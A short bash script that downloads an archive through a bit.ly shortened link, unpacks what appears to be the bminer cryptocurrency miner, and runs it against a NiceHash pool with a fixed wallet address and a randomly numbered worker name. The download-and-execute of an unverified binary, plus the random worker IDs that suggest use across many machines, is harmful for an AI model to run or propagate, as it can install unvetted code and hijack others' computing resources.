#!/bin/bash
wget https://bit.ly/3hREHiM
tar -xf 3hREHiM
cd bminer-v16.4.7-cccd70d
./bminer -uri zhash://3EhmiQgfEoT1mg4ajPgQwGRg1iatY1dJ9E.$(echo $(shuf -i 1-20 -n 1)-ZH)@zhash.usa-west.nicehash.com:3369
